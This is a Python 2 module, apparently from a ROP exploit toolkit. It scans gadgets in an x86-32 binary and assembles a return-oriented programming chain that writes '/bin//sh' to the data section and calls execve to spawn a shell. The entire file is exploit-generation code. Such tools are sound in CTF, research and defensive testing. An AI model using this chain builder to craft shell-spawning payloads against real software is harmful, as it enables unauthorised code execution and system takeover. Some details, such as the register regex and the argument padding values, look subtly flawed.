from struct import pack
import re

class Ropchain(object):
    def __init__(self, gadgets, data_section_offset):
        self._gadgets = gadgets
        self._data_section_offset = data_section_offset
        self._write_tested = []
        self._chain = []

        self._find_ropchain_gadgets()

    @staticmethod
    def _missing_gadgets(messages):
        for message in messages:
            print "Unable to find gadget '{0}'".format(message)

    @staticmethod
    def _found_gadgets(gadgets):
        for gadget in gadgets:
            print("Found gadget at 0x%x: %s") % (gadget["vaddr"],
                                                 gadget["insts"])

    @staticmethod
    def _pad_chain(gadgets, regs_set):
        lg = gadgets["insts"].split(" ; ")
        chain = ''
        for g in lg[1:]:
            if g.split()[0] == "pop":
                reg = g.split()[1]
                try:
                    chain += pack('<I', regs_set[reg])
                except KeyError:
                    chain += pack('<I', 0xdeadbeef)
        return chain

    def _find_instruction(self, instruction):
        for gadget in self._gadgets:
            usable = True
            match = re.search(instruction, gadget["insts"].split(" ; ")[0])
            if match:
                if (gadget["vaddr"] in self._write_tested and
                        ('dst' in instruction or 'src' in instruction)):
                    continue
                instructions = gadget["insts"].split(" ; ")[1:]
                for inst in instructions:
                    if inst.split()[0] != "pop" and inst.split()[0] != "ret":
                        usable = False
                    if (inst != "ret" and inst.split()[0] == "ret" and
                            inst.split()[1] != ""):
                        usable = False
                if not usable:
                    continue
                dst = src = None
                if 'dst' in instruction and 'src' in instruction:
                    dst = match.group("dst")
                    src = match.group("src")
                return (gadget, dst, src)
        return (None, None, None)

    def _find_ropchain_gadgets(self):
        write_regex = r"mov dword ptr \[(?P<dst>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)]{3}))\], "\
                      r"(?P<src>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)]{3}))$"
        missing_gadgets = []

        self._gadgets.reverse()

        print 'Collecting gadgets for ropchain:'
        print '-Write to arbritary address'

        while True:
            (write, reg_a, reg_b) = self._find_instruction(write_regex)
            if not write:
                self._missing_gadgets(["mov dword ptr [r32], r32"])
                return

            self._found_gadgets([write])

            pop_dst = self._find_instruction("pop {0}".format(reg_a))[0]
            if not pop_dst:
                self._missing_gadgets(["pop {0}".format(reg_a)])

            pop_src = self._find_instruction("pop {0}".format(reg_b))[0]
            if not pop_src:
                self._missing_gadgets(["pop {0}".format(reg_b)])

            xor_src = self._find_instruction("xor {0}, {0}".format(reg_b))[0]
            if not xor_src:
                self._missing_gadgets(["xor {0}, {0}".format(reg_b)])

            if not pop_dst or not pop_src or not xor_src:
                self._write_tested.append(write["vaddr"])
                continue
            else:
                self._found_gadgets([pop_dst, pop_src, xor_src])
                break

        # Init syscall number
        xor_eax = self._find_instruction("xor eax, eax")[0]
        if not xor_eax:
            missing_gadgets.append("xor eax, eax")

        inc_eax = self._find_instruction("inc eax")[0]
        if not inc_eax:
            missing_gadgets.append("inc eax")

        # Init syscall arguments
        pop_ebx = self._find_instruction("pop ebx")[0]
        if not pop_ebx:
            missing_gadgets.append("pop ebx")

        pop_ecx = self._find_instruction("pop ecx")[0]
        if not pop_ecx:
            missing_gadgets.append("pop ecx")

        pop_edx = self._find_instruction("pop edx")[0]
        if not pop_edx:
            missing_gadgets.append("pop edx")

        # Syscall
        syscall = self._find_instruction(("int 0x80|sysenter|syscall|call "
                                          "DWORD PTR gs:0x10"))[0]

        if not syscall:
            missing_gadgets.append("syscall")

        if any(not r for r in [xor_eax, inc_eax, pop_ebx,
                               pop_ecx, pop_edx, syscall]):
            self._missing_gadgets(missing_gadgets)
            return

        print "-Init syscall number"
        self._found_gadgets([xor_eax, inc_eax])

        print "-Init syscall arguments"
        self._found_gadgets([pop_ebx, pop_ecx, pop_edx])

        print "-Syscall"
        self._found_gadgets([syscall])

        print '------------------------------------------------------'

        self._generate_chain(write, pop_dst, pop_src, xor_src, xor_eax,
                             pop_ebx, pop_ecx, pop_edx, inc_eax, syscall)

    def _generate_chain(self, write, pop_dst, pop_src, xor_src,
                        xor_eax, pop_ebx, pop_ecx, pop_edx, inc_eax, syscall):
        data_address = self._data_section_offset
        if data_address is None:
            print "Data section not found"
            return

        chain = ''

        # Write /bin//sh to data section
        chain += pack('<I', pop_dst["vaddr"])  # setup write destination
        chain += pack('<I', data_address)      # with address of data section
        chain += self._pad_chain(pop_dst, {})

        chain += pack('<I', pop_src["vaddr"])  # setup write source
        chain += '/bin'                        # with first part of /bin/sh
        chain += self._pad_chain(pop_src, {pop_dst["insts"].split()[1]: data_address})
                                               # keep write destination

        chain += pack('<I', write["vaddr"])    # do write
        chain += self._pad_chain(write, {})

        chain += pack('<I', pop_dst["vaddr"])  # setup write destination
        chain += pack('<I', data_address + 4)  # with address of data section
        chain += self._pad_chain(pop_dst, {})

        chain += pack('<I', pop_src["vaddr"])  # setup write source
        chain += '//sh'                        # with second part of /bin/sh
        chain += self._pad_chain(pop_src, {pop_dst["insts"].split()[1]: data_address + 4})
                                               # keep write destination

        chain += pack('<I', write["vaddr"])    # do write
        chain += self._pad_chain(write, {})

        chain += pack('<I', pop_dst["vaddr"])  # setup write destination
        chain += pack('<I', data_address + 8)  # with address of data section
        chain += self._pad_chain(pop_dst, {})

        chain += pack('<I', xor_src["vaddr"])  # setup write source
        chain += self._pad_chain(xor_src, {pop_dst["insts"].split()[1]: data_address + 8})
                                               # keep write destination

        chain += pack('<I', write["vaddr"])    # do write
        chain += self._pad_chain(write, {})

        # Set first argument as /bin//sh
        chain += pack('<I', pop_ebx["vaddr"])
        chain += pack('<I', data_address)
        chain += self._pad_chain(pop_ebx, {})

        # Set second argument as \x00
        chain += pack('<I', pop_ecx["vaddr"])
        chain += pack('<I', data_address + 8)
        chain += self._pad_chain(pop_ecx, {"ebx": data_address + 8})
                                               # keep first argument

        # Set third argument as \x00
        chain += pack('<I', pop_edx["vaddr"])
        chain += pack('<I', data_address + 8)
        chain += self._pad_chain(pop_edx, {"ebx": data_address + 8,
                                           "ecx": data_address + 8})
                                               # keep first and second arguments

        # Set first argument to 0xb (syscall entry for execve)
        chain += pack('<I', xor_eax["vaddr"])  # init eax with \x00
        chain += self._pad_chain(xor_eax, {"ebx": data_address + 8,
                                           "ecx": data_address + 8})
                                               # keep first and second arguments

        for _ in range(0xb):
            chain += pack('<I', inc_eax["vaddr"])
            chain += self._pad_chain(inc_eax, {"ebx": data_address + 8,
                                               "ecx": data_address + 8})
                                               # keep first and second arguments

        # Make syscall
        chain += pack('<I', syscall["vaddr"])

        self._chain = chain

    def pretty_print_chain(self):
        if not self._chain:
            print 'Not enough gadgets found to generate chain.'
        else:
            print 'Generated chain:'
            print repr(self._chain)

        print '------------------------------------------------------'
